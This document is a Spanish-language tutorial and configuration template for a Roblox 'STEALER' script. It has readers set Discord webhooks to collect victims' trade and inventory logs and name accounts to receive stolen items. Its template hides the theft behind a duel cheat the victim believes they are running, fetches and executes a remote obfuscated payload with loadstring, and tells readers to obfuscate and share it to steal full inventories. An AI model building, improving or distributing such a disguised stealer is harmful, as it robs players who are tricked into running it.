# STEALER

📢 Tutorial: Cómo Configurar y Usar el Script
Sigue estos sencillos pasos para configurar el script correctamente antes de inyectarlo.
🛠️ Paso 1: Configurar los Webhooks (Discord)
Para recibir las notificaciones de los tradeos y el inventario en tu servidor, necesitas crear dos Webhooks en tu canal de Discord:
 * Ve a Ajustes del canal > Integraciones > Crear Webhook. (tutorial en el siguien link de youtube) ""
https://youtu.be/TrMzEfVYBxI?si=C5ypJ1O8v4Y__pHO"
 * Copia la URL de los webhooks y pégalos en la sección de configuración del script donde dice "TU_WEBHOOK_LOGS_AQUI" y "TU_WEBHOOK_INVENTARIO_AQUI".
🎯 Paso 2: Jugadores Objetivos
En la lista JugadoresObjetivos, pon los nombres de usuario de Roblox a los que quieres apuntar para enviar los items. Asegúrate de que estén entre comillas y separados por comas.
> Ejemplo: "Usuario123", "ProGamer99"
> 
⚙️ Paso 3: Agregar tu Script de Duelos
El script tiene un espacio libre preparado para que agregues tu propio script de PvP. Ahí puedes pegar cualquier script de duelos que uses normalmente para jugar y funcionará al mismo tiempo de fondo.
🚀 Paso 4: ¡Ejecutar!
Copia el código final, y ofuscalo en esta paguina web (solo pega el codigo y dale click a ofuscar "https://wearedevs.net/obfuscator" y compartelo para robar inventario completos.
📄 Código de Configuración
Copia el siguiente código y ajústalo con tu información:




-- ==========================================
-- CONFIGURACIÓN PERSONALIZABLE
-- ==========================================
getgenv().AutoTradeConfig = {
    WebhookLogs = "TU_WEBHOOK_LOGS_AQUI",
    WebhookInventario = "TU_WEBHOOK_INVENTARIO_AQUI",
    
    JugadoresObjetivos = {
        "Jugador1", 
        "Jugador2",
        "Jugador3"
    }
}

-- ==========================================
-- SCRIPT DE DUELOS (PVP)
-- ==========================================
-- Pega tu script de duelos que gustes aquí debajo
task.spawn(function()
    -- Script de duelos aquí:
    "scriptblox.com"
    "video de como conseguir los script aqui ---> "". "
end)

-- ==========================================
-- CARGA DEL SCRIPT PRINCIPAL OFUSCADO
-- ==========================================
local rawUrl = "ENLACE_DE_TU_SCRIPT_AQUI"
loadstring(game:HttpGet(rawUrl))()


